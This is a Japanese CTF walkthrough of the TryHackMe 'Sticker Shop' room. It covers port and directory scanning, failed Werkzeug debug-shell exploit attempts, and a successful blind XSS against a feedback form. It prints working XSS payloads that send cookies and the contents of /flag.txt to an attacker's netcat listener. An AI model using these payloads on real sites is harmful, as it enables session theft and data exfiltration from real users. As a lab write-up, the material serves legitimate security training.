# The Sticker Shop CTF

https://tryhackme.com/r/room/thestickershop

最終目標は下記とのこと。普通にアクセスしたら 401 になる。  
http://10.10.178.54:8080/flag.txt

## 偵察

### ポートスキャン

```shell
$ sudo nmap -sS $TARGET
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 02:01 EST
Nmap scan report for 10.10.178.54
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds
```

SSH と HTTP

```shell
$ sudo nmap -sV -p22 10.10.178.54
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 03:42 EST
Nmap scan report for 10.10.178.54
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
```

OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)

### Dirb

```shell
$ dirb http://$TARGET:8080 /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Dec 20 03:11:37 2024
URL_BASE: http://10.10.178.54:8080/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.178.54:8080/ ----

-----------------
END_TIME: Fri Dec 20 03:53:02 2024
DOWNLOADED: 4612 - FOUND: 0
```

何もなし！

### whatweb

```shell
$ whatweb -v http://10.10.178.54:8080
WhatWeb report for http://10.10.178.54:8080
Status    : 200 OK
Title     : Cat Sticker Shop
IP        : 10.10.178.54
Country   : RESERVED, ZZ

Summary   : HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.8.10], Python[3.8.10], Werkzeug[3.0.1]

Detected Plugins:
[ HTML5 ]
        HTML version 5, detected by the doctype declaration


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to
        identify the operating system from the server header.

        String       : Werkzeug/3.0.1 Python/3.8.10 (from server string)

[ Python ]
        Python is a programming language that lets you work more
        quickly and integrate your systems more effectively. You
        can learn to use Python and see almost immediate gains in
        productivity and lower maintenance costs.

        Version      : 3.8.10
        Website     : http://www.python.org/

[ Werkzeug ]
        Werkzeug is a WSGI utility library for Python.

        Version      : 3.0.1
        Website     : http://werkzeug.pocoo.org/

HTTP Headers:
        HTTP/1.1 200 OK
        Server: Werkzeug/3.0.1 Python/3.8.10
        Date: Fri, 20 Dec 2024 07:02:47 GMT
        Content-Type: text/html; charset=utf-8
        Content-Length: 1655
        Connection: close
```

Werkzeug/3.0.1

###

```shell
$ searchsploit Werkzeug
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Pallets Werkzeug 0.15.4 - Path Traversal                             | python/webapps/50101.py
Werkzeug - 'Debug Shell' Command Execution                           | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)                | python/remote/37814.rb
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

RCE があるが、対象バージョン不明。

## exploitDB

```shell
msf6 exploit(multi/http/werkzeug_debug_rce) > run

[*] Started reverse TCP handler on 192.168.11.9:4444
[-] Secret code not detected.
[*] Exploit completed, but no session was created.
```

効果なし。

```shell
$ python2 43905.py 10.10.178.54 8080 10.2.22.182 1234
[-] Debug is not enabled
```

効果なし。

/submit_feedback に対応する、feedback を閲覧する画面があるのではないかと思い、探す。  
http://10.10.178.54:8080/view_feedback  
は 401 になるので存在はする模様。

401 が返るってことはどこかにログイン画面があると思うのだが・・・

### 次のアクション選択

1. dirbuster で隠しページを探す
2. submit_feedback 画面で脆弱性を探す
3. SSH のブルートフォース

1 は THM の環境では dirbuster は無理だと思う。  
3 も、何もリストがないと現実的ではない。  
2 は、登録時の処理（Python）でコマンドインジェクションや SQL インジェクションを実行するトリガーは無さそう。

もしかすると、スタッフが登録内容を /view_feedback で閲覧するというシナリオで、ボットが動いているのでは？  
ということで、XSS でクッキーを盗む js コードの登録を試してみる。

## XSS
### Cookie
サブミット画面で次のテキストを入力

```javascript
<script>document.write('<img src="http://10.2.22.182:1234/' + document.cookie + '">')</script>

↓

$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.248.61] 60644
GET / HTTP/1.1
Host: 10.2.22.182:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

```javascript
<img src=x onerror=this.src="http://10.2.22.182:1234/?c="+document.cookie>

↓

$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.248.61] 32960
GET / HTTP/1.1
Host: 10.2.22.182:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

document.cookie で Cookie が取れていない。たぶん、Http-Only の Cookie だと思われる。

### flag.txt
/flag.txt の内容を直接パラメータとして渡すコードに変更。

```javascript
<script>
fetch('/flag.txt')
  .then(response => response.text())
  .then(data => {
    new Image().src = "http://10.2.22.182:1234/?flag=" + encodeURIComponent(data);
  });
</script>

↓

$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.248.61] 58632
GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1
Host: 10.2.22.182:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D  
URLデコード  
flag=THM{83789a69074f636f64a38879cfcabe8b62305ee6}

フラグゲット！

## 振り返り
- 「ありがとう、スタッフがすぐに確認します」みたいなメッセージは、（後から考えれば）Readボットの存在をほのめかしていた。
- CTF は第三者のアクションがあることを想像しにくいので、XSS が盲点になりがち。今後気を付ける。
